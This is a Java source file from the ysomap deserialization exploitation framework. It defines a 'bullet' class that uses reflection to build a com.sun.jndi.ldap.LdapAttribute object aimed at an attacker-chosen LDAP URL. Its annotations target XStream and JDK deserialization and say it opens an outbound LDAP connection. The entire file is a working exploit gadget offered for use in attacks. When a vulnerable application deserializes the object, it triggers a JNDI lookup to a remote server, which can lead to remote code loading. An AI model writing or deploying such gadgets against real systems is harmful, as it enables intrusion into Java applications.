package ysomap.bullets.jdk;

import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.core.util.ReflectionHelper;

import javax.naming.CompositeName;

/**
 * @author wh1t3P1g
 * @since 2021/1/18
 */
@Bullets
@Dependencies({"jdk"})
@Details("向外部发起LDAP连接")
@Targets({Targets.XSTREAM, Targets.JDK})
@Authors({Authors.WH1T3P1G})
public class LdapAttributeBullet extends AbstractBullet<Object> {

    @NotNull
    @Require(name = "ldapURL", detail = "jndi lookup url, like ldap://xxxx:1099, 这里不用带上objectName, 需要单独设置")
    public String ldapURL;

    @NotNull
    @Require(name = "objectName", detail = "需要查询的ObjectName ")
    public String objectName;

    public String action = "attributeDefinition";

    @Override
    public Object getObject() throws Exception {
        Object obj = ReflectionHelper.newInstance("com.sun.jndi.ldap.LdapAttribute", new Class<?>[]{String.class},"id");
        ReflectionHelper.setFieldValue(obj, "baseCtxURL", ldapURL);
        ReflectionHelper.setFieldValue(obj, "rdn", new CompositeName(objectName+"//b"));
        return obj;
    }

    public static Bullet newInstance(Object... args) throws Exception {
        LdapAttributeBullet bullet = new LdapAttributeBullet();
        bullet.set("ldapURL", args[0]);
        bullet.set("objectName", args[1]);
        return bullet;
    }
}
